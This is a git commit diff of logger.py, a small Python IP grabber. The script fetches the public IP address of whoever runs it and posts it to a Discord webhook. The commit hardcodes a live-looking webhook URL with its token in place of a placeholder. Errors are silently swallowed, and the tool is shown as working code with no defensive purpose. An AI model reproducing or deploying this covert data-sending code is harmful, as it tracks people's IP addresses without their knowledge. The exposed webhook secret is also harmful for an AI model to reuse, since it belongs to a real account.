0bbc8974d6d7f2743cf70011a7c88398e4d559c0
Schuh <141640357+Schuh1337@users.noreply.github.com>
2024-02-06 05:01:06 +0100

    Update logger.py

--- logger.py
+++ logger.py
@@ -1,28 +1,37 @@
 import requests, logging, datetime
 
-def setup_logging():
-    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
 def get_ip():
     try:
-        headers = {'User-Agent': 'schuh/69.0'}
+        headers = {
+            'User-Agent': 'MyCustomUserAgent/1.0'
+        }
         response = requests.get('https://api64.ipify.org?format=json', headers=headers)
         data = response.json()
         return data.get('ip')
-    except Exception:
+    except Exception as e:
+        logging.error("Error getting public IP: %s", e)
         return None
 
 def send_to_webhook(webhook_url, ip_address):
     try:
-        embed = {"title": "User Logged:", "description": f"User IP Address: {ip_address}", "timestamp": datetime.datetime.utcnow().isoformat(), "color": 16711680}
-        data = {"embeds": [embed]}
-        response = requests.post(webhook_url, json=data)
+        embed = {
+            "title": "User Logged:",
+            "description": f"User IP Address: {ip_address}",
+            "timestamp": datetime.datetime.now().isoformat(),
+            "color": 16711680
+        }
+
+        data = {
+            "embeds": [embed]
+        }
+
+        requests.post(webhook_url, json=data)
+        
     except Exception as e:
         pass
 
 if __name__ == "__main__":
-    setup_logging()
-    webhook_url = "WEBHOOK_URL_HERE"
+    webhook_url = "https://discord.com/api/webhooks/1120331502853570631/DQTeRY7LQeCT7daVCnFJrzn2PLyIV74NVsJIy7rkkN3n8XJKGkbLiZxKA9dnK4FncLD5"
     user_ip = get_ip()
     if user_ip:
         send_to_webhook(webhook_url, user_ip)
